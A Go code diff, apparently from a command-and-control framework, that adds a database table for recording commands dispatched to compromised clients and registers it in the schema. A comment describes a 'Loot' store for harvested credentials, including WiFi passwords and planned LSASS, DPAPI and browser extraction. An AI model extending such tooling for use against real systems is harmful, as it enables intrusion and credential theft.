@@ -390,6 +390,24 @@ type Plugin struct {
 	UploadTime time.Time `json:"upload_time" xorm:"datetime notnull"`
 }
 
+// Task 一等任务记录（C14 从内存态升级：重启不丢、可查询、可取消、可审计）。
+// 一次批量下发按 uid 各建一行（BatchID 相同）；控制台命令与内存执行各建一行。
+// 协议没有逐命令 ACK，完成态由"该 uid 的下一条命令输出"近似归属（见 api.OnTaskOutput）。
+type Task struct {
+	Id      int64  `xorm:"pk autoincr" json:"id"`
+	BatchID string `xorm:"'batch_id' varchar(40) index" json:"batch_id"`
+	// 列名必须显式指定：xorm 默认把 UID 映射成 u_id，与查询里的 uid 对不上
+	UID        string    `xorm:"'uid' varchar(128) index" json:"uid"`
+	Operator   string    `xorm:"varchar(64)" json:"operator"`
+	Kind       string    `xorm:"varchar(20) index" json:"kind"`   // batch / console / exec
+	Command    string    `xorm:"text" json:"command"`
+	Status     string    `xorm:"varchar(20) index" json:"status"` // dispatched / completed / failed / cancelled / timeout
+	Result     string    `xorm:"text" json:"result"`
+	Error      string    `xorm:"varchar(512)" json:"error"`
+	CreatedAt  time.Time `xorm:"'created_at' datetime notnull index" json:"created_at"`
+	FinishedAt time.Time `xorm:"'finished_at' datetime" json:"finished_at"`
+}
+
 // Loot 凭据/制品库(功能批): 行动中获取的凭据与制品集中管理。
 // 来源: 手动录入 / 命令产出自动识别(WiFi 密码等) / 后续提取命令族(LSASS/DPAPI/浏览器)。
 type Loot struct {
@@ -1151,7 +1169,9 @@ _, _ = Engine.Exec("PRAGMA mmap_size=268435456")
 		t := time.NewTicker(5 * time.Minute)
 		defer t.Stop()
 		for range t.C {
-			_, _ = Engine.Exec("PRAGMA wal_checkpoint(TRUNCATE)")
+			if e := currentEngine(); e != nil {
+				_, _ = e.Exec("PRAGMA wal_checkpoint(TRUNCATE)")
+			}
 		}
 	}()
 
@@ -1179,7 +1199,7 @@ _, _ = Engine.Exec("PRAGMA mmap_size=268435456")
 	// 新库不再创建; 复合索引价值有限(online/listener 各有单列索引)。
 	_, _ = Engine.Exec("DROP INDEX IF EXISTS idx_clients_online_listener")
 
-	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(DeliveryAccessLog), new(Socks5), new(TunnelProxy), new(AuditLogDB), new(Plugin), new(StagerToken), new(Loot))
+	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(DeliveryAccessLog), new(Socks5), new(TunnelProxy), new(AuditLogDB), new(Plugin), new(StagerToken), new(Loot), new(Task))
 _, _ = Engine.Exec("CREATE INDEX IF NOT EXISTS idx_clients_uid ON clients(uid)")  
 _, _ = Engine.Exec("CREATE INDEX IF NOT EXISTS idx_clients_online ON clients(online)")  
 _, _ = Engine.Exec("CREATE INDEX IF NOT EXISTS idx_clients_listener ON clients(listener)")  
